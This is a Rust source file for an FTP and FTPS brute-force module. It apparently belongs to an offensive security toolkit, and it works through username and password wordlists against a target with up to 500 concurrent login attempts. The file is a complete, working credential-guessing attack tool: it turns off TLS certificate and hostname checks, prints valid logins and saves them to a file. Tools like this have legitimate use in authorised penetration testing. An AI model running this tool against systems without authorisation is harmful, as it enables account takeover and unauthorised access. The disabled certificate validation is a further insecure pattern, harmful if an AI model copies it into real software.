use anyhow::{anyhow, Result};
use colored::*;
use suppaftp::{AsyncFtpStream, AsyncNativeTlsConnector, AsyncNativeTlsFtpStream};
use suppaftp::async_native_tls::TlsConnector;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    path::PathBuf,
    sync::Arc,
    time::Instant,
};
use std::path::Path;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use tokio::{sync::{Mutex, Semaphore}, time::{sleep, Duration}};
use futures::stream::{FuturesUnordered, StreamExt};

const PROGRESS_INTERVAL_SECS: u64 = 2;

// Statistics tracking for progress reporting
struct Statistics {
    total_attempts: AtomicU64,
    successful_attempts: AtomicU64,
    failed_attempts: AtomicU64,
    error_attempts: AtomicU64,
    start_time: Instant,
}

impl Statistics {
    fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful_attempts: AtomicU64::new(0),
            failed_attempts: AtomicU64::new(0),
            error_attempts: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }

    fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.error_attempts.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
        }
    }

    fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        print!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {:.1}/s    ",
            "[Progress]".cyan(),
            total.to_string().bold(),
            success.to_string().green(),
            failed,
            errors.to_string().red(),
            rate
        );
        let _ = std::io::stdout().flush();
    }

    fn print_final(&self) {
        println!();
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();

        println!("{}", "=== Statistics ===".bold());
        println!("  Total attempts:    {}", total);
        println!("  Successful:        {}", success.to_string().green().bold());
        println!("  Failed:            {}", failed);
        println!("  Errors:            {}", errors.to_string().red());
        println!("  Elapsed time:      {:.2}s", elapsed);
        if elapsed > 0.0 {
            println!("  Average rate:      {:.1} attempts/s", total as f64 / elapsed);
        }
    }
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   FTP Brute Force Module                                  ║".cyan());
    println!("{}", "║   Supports FTP and FTPS (TLS) with IPv4/IPv6              ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

/// Format IPv4 or IPv6 addresses with port
fn format_addr(target: &str, port: u16) -> String {
    if target.starts_with('[') && target.contains("]:") {
        target.to_string()
    } else if target.matches(':').count() == 1 && !target.contains('[') {
        target.to_string()
    } else {
        let clean_target = if target.starts_with('[') && target.ends_with(']') {
            &target[1..target.len() - 1]
        } else {
            target
        };
        if clean_target.contains(':') {
            format!("[{}]:{}", clean_target, port)
        } else {
            format!("{}:{}", clean_target, port)
        }
    }
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).cyan());

    let port: u16 = loop {
        let input = prompt_default("FTP Port", "21")?;
        if let Ok(p) = input.parse() { break p }
        println!("Invalid port. Try again.");
    };
    let usernames_file = prompt_required("Username wordlist")?;
    let passwords_file = prompt_required("Password wordlist")?;
    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "500")?;
        if let Ok(n) = input.parse::<usize>() {
            if n > 0 { break n }
        }
        println!("Invalid number. Try again.");
    };

    // Create a semaphore to limit concurrent network operations
    let semaphore = Arc::new(Semaphore::new(concurrency));

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file", "ftp_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode (user × pass)?", false)?;

    let addr = format_addr(target, port);
    let found = Arc::new(Mutex::new(Vec::new()));
    let stop = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(Statistics::new());

    println!("\n[*] Starting brute-force on {}", addr);

    let users = load_lines(&usernames_file)?;
    if users.is_empty() {
        println!("[!] Username wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("{}", format!("[*] Loaded {} usernames", users.len()).cyan());

    let passes = load_lines(&passwords_file)?;
    if passes.is_empty() {
        println!("[!] Password wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("{}", format!("[*] Loaded {} passwords", passes.len()).cyan());

    let total_attempts = if combo_mode { users.len() * passes.len() } else { passes.len() };
    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
    println!();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    let mut tasks = FuturesUnordered::new();

    if combo_mode {
        for user in &users {
            if stop_on_success && stop.load(Ordering::Relaxed) { break; }
            for pass in &passes {
                if stop_on_success && stop.load(Ordering::Relaxed) { break; }

                let addr_clone = addr.clone();
                let user_clone = user.clone();
                let pass_clone = pass.clone();
                let found_clone = Arc::clone(&found);
                let stop_clone = Arc::clone(&stop);
                let semaphore_clone = Arc::clone(&semaphore);
                let stats_clone = Arc::clone(&stats);
                let verbose_flag = verbose;
                let stop_on_success_flag = stop_on_success;

                tasks.push(tokio::spawn(async move {
                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
                        return;
                    }
                    let permit = match semaphore_clone.acquire_owned().await {
                        Ok(permit) => permit,
                        Err(_) => return,
                    };
                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
                        return;
                    }
                    match try_ftp_login(&addr_clone, &user_clone, &pass_clone, verbose_flag).await {
                        Ok(true) => {
                            println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone).green().bold());
                            found_clone.lock().await.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
                            stats_clone.record_attempt(true, false);
                            if stop_on_success_flag {
                                stop_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                            if verbose_flag {
                                println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                            if verbose_flag {
                                println!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
                            }
                        }
                    }
                    drop(permit);
                }));
            }
        }
    } else {
        if !users.is_empty() {
            for (i, pass) in passes.iter().enumerate() {
                if stop_on_success && stop.load(Ordering::Relaxed) { break; }
                let user = users.get(i % users.len()).expect("User list modulus logic error").clone();

                let addr_clone = addr.clone();
                let pass_clone = pass.clone();
                let found_clone = Arc::clone(&found);
                let stop_clone = Arc::clone(&stop);
                let semaphore_clone = Arc::clone(&semaphore);
                let stats_clone = Arc::clone(&stats);
                let verbose_flag = verbose;
                let stop_on_success_flag = stop_on_success;

                tasks.push(tokio::spawn(async move {
                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
                        return;
                    }
                    let permit = match semaphore_clone.acquire_owned().await {
                        Ok(permit) => permit,
                        Err(_) => return,
                    };
                    if stop_on_success_flag && stop_clone.load(Ordering::Relaxed) {
                        return;
                    }
                    match try_ftp_login(&addr_clone, &user, &pass_clone, verbose_flag).await {
                        Ok(true) => {
                            println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user, pass_clone).green().bold());
                            found_clone.lock().await.push((addr_clone.clone(), user.clone(), pass_clone.clone()));
                            stats_clone.record_attempt(true, false);
                            if stop_on_success_flag {
                                stop_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                            if verbose_flag {
                                println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user, pass_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                            if verbose_flag {
                                println!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
                            }
                        }
                    }
                    drop(permit);
                }));
            }
        }
    }

    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
            if verbose {
                println!("\r{}", format!("[!] Task error: {}", e).red());
            }
        }
    }

    // Stop progress reporter
    stop.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    // Print final statistics
    stats.print_final();

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("{}", "[-] No credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (host, user, pass) in creds.iter() {
            println!("  {}  {} -> {}:{}", "✓".green(), host, user, pass);
        }
        if let Some(path) = save_path {
            let file_path = get_filename_in_current_dir(&path);
            match File::create(&file_path) {
                Ok(mut file) => {
                    for (host, user, pass) in creds.iter() {
                        if writeln!(file, "{} -> {}:{}", host, user, pass).is_err() {
                            eprintln!("[!] Error writing to result file '{}'", file_path.display());
                            break;
                        }
                    }
                    println!("[+] Results saved to '{}'", file_path.display());
                }
                Err(e) => {
                     eprintln!("[!] Could not create or write to result file '{}': {}", file_path.display(), e);
                }
            }
        }
    }
    Ok(())
}

async fn try_ftp_login(addr: &str, user: &str, pass: &str, verbose: bool) -> Result<bool> {
    // Attempt 1: Plain FTP
    match AsyncFtpStream::connect(addr).await {
        Ok(mut ftp) => {
            match ftp.login(user, pass).await {
                Ok(_) => {
                    let _ = ftp.quit().await;
                    return Ok(true);
                }
                Err(e) => {
                    let msg = e.to_string();
                    if msg.contains("530") {
                        return Ok(false);
                    } else if msg.contains("550 SSL/TLS required") || msg.contains("TLS required on the control channel") || msg.contains("220 TLS go first") || msg.contains("SSL connection required") {
                        println!("[i] {} - Plain FTP login indicated TLS required. Attempting FTPS...", addr);
                    } else if msg.contains("421") {
                        println!("[-] {} - Server reported too many connections (421). Sleeping briefly...", addr);
                        sleep(Duration::from_secs(2)).await;
                        return Ok(false);
                    } else {
                        if verbose {
                            println!("[!] FTP login error for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, msg, e);
                        }
                        return Err(anyhow!("FTP login error: {}", msg));
                    }
                }
            }
        }
        Err(e) => {
            let msg = e.to_string();
            if msg.contains("SSL/TLS required") || msg.contains("TLS required on the control channel") || msg.contains("220 TLS go first") || msg.contains("SSL connection required") {
                println!("[i] {} - Plain FTP connection indicated TLS required. Attempting FTPS...", addr);
            } else if msg.contains("421") {
                println!("[-] {} - Server reported too many connections during connect (421). Sleeping briefly...", addr);
                sleep(Duration::from_secs(2)).await;
                return Ok(false);
            } else {
                if verbose {
                    println!("[!] FTP connection error to {} ({}:{}): {} - Raw: {:?}", addr, user, pass, msg, e);
                }
                return Err(anyhow!("FTP connection error: {}", msg));
            }
        }
    }

    // 2️⃣ Only if needed, try FTPS
    if verbose {
        println!("[i] {} Attempting FTPS login for user '{}'", addr, user);
    }
    let mut ftp_tls = AsyncNativeTlsFtpStream::connect(addr)
        .await
        .map_err(|e| {
            if verbose {
                println!("[!] FTPS base connect failed for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, e, e);
            }
            anyhow!("FTPS base connect failed: {}", e)
        })?;

    let connector = AsyncNativeTlsConnector::from(
        TlsConnector::new()
            .danger_accept_invalid_certs(true)
            .danger_accept_invalid_hostnames(true),
    );

    let domain = addr
        .trim_start_matches('[')
        .split(&[']', ':'][..])
        .next()
        .unwrap_or(addr);

    ftp_tls = ftp_tls
        .into_secure(connector, domain)
        .await
        .map_err(|e| {
            if verbose {
                println!("[!] TLS upgrade failed for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, e, e);
            }
            anyhow!("TLS upgrade failed: {}", e)
        })?;

    match ftp_tls.login(user, pass).await {
        Ok(_) => {
            let _ = ftp_tls.quit().await;
            Ok(true)
        }
        Err(e) => {
            let msg = e.to_string();
            if msg.contains("530") {
                Ok(false)
            } else {
                if verbose {
                    println!("[!] FTPS error for {} ({}:{}): {} - Raw: {:?}", addr, user, pass, msg, e);
                }
                Err(anyhow!("FTPS error: {}", msg))
            }
        }
    }
}


// === Helpers === (prompt_required, prompt_default, prompt_yes_no, load_lines, log, get_filename_in_current_dir remain unchanged)

fn prompt_required(msg: &str) -> Result<String> {
    loop {
        print!("{}", format!("{}: ", msg).cyan().bold());
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let trimmed = s.trim();
        if !trimmed.is_empty() {
            return Ok(trimmed.to_string());
        }
        println!("{}", "This field is required.".yellow());
    }
}

fn prompt_default(msg: &str, default: &str) -> Result<String> {
    print!("{}", format!("{} [{}]: ", msg, default).cyan().bold());
    std::io::stdout().flush()?;
    let mut s = String::new();
    std::io::stdin().read_line(&mut s)?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        default.to_string()
    } else {
        trimmed.to_string()
    })
}

fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
    let default_char = if default_yes { "y" } else { "n" };
    loop {
        print!("{}", format!("{} (y/n) [{}]: ", msg, default_char).cyan().bold());
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let input = s.trim().to_lowercase();
        match input.as_str() {
            "" => return Ok(default_yes),
            "y" | "yes" => return Ok(true),
            "n" | "no" => return Ok(false),
            _ => println!("{}", "Invalid input. Please enter 'y' or 'n'.".yellow()),
        }
    }
}

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path.as_ref()).map_err(|e| anyhow!("Failed to open file '{}': {}", path.as_ref().display(), e))?;
    let reader = BufReader::new(file);
    Ok(reader
        .lines()
        .filter_map(|line| line.ok().map(|s| s.trim().to_string()))
        .filter(|line| !line.is_empty())
        .collect())
}

fn get_filename_in_current_dir(input: &str) -> PathBuf {
    Path::new(input)
        .file_name()
        .map(|name_os_str| PathBuf::from(format!("./{}", name_os_str.to_string_lossy())))
        .unwrap_or_else(|| PathBuf::from(input))
}
